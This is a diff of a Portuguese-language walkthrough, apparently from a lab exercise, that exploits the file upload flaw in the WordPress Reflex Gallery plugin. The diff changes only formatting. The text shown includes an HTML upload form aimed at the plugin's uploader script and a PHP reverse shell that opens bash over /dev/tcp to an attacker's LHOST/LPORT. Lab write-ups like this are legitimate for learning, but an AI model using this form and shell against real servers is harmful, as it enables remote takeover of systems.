@@ -79,7 +79,7 @@ Que ao ser acessado, retorna um erro dizendo que não tem arquivos carregados, e
 
 Como não achamos o lugar para fazer o upload, no exploit tem o código de um formulário que poderemos usar para o isso.
 
-```bash
+```html
 <form method="POST" action="http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php" enctype="multipart/form-data" >
     <input type="file" name="qqfile"><br>
     <input type="submit" name="Submit" value="Pwn!">
@@ -90,11 +90,12 @@ Agora precisamos criar a reverse shell para enviar usando esse formulário.
 
 Vamos usar uma shell simples que utiliza a função [exec()](https://www.php.net/manual/en/function.exec.php) do php.
 
-```php
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
-?>
-```
+><?php
+>
+>exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
+>
+>?>
+
 
 Vamos então abrir o formulário que criamos e fazer o upload da reverse shell no servidor alvo.
 
